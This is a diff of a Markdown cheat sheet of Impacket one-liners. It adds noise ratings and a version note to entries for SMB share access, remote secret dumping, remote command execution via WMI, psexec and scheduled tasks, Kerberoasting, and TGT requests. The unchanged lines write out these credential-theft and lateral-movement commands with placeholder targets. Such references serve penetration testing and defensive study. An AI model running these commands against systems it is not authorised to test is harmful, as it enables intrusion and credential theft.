@@ -1,5 +1,7 @@
 # Impacket
 
+<div class="ol-version-note">Syntax can drift between releases. Confirm with the tool's local <code>--version</code> and <code>--help</code> output.</div>
+
 Frequently used Impacket one-liners.
 
 ### SMB shares
@@ -8,7 +10,7 @@ Frequently used Impacket one-liners.
 smbclient.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Shares · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Shares · **Context:** Domain user · **Noise:** Moderate
 
 ### Remote registry secrets
 
@@ -16,7 +18,7 @@ smbclient.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Credentials, Remote Registry · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux · **Tags:** Credentials, Remote Registry · **Context:** Domain user · **Noise:** Moderate
 
 ### WMI shell
 
@@ -24,7 +26,7 @@ secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** WMI, Execution · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux · **Tags:** WMI, Execution · **Context:** Domain user · **Noise:** Moderate
 
 ### SMB service execution
 
@@ -32,7 +34,7 @@ wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 psexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Execution · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Execution · **Context:** Domain user · **Noise:** Moderate
 
 ### Scheduled task execution
 
@@ -40,7 +42,7 @@ psexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
 atexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST> "whoami"
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Task Scheduler, Execution · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux · **Tags:** Task Scheduler, Execution · **Context:** Domain user · **Noise:** Moderate
 
 ### Request service ticket
 
@@ -48,7 +50,7 @@ atexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST> "whoami"
 GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, SPN · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, SPN · **Context:** Domain user · **Noise:** Moderate
 
 ### Request TGT
 
@@ -56,7 +58,7 @@ GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
 getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, TGT · **Context:** Domain user
+**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, TGT · **Context:** Domain user · **Noise:** Moderate
 
 ---
 
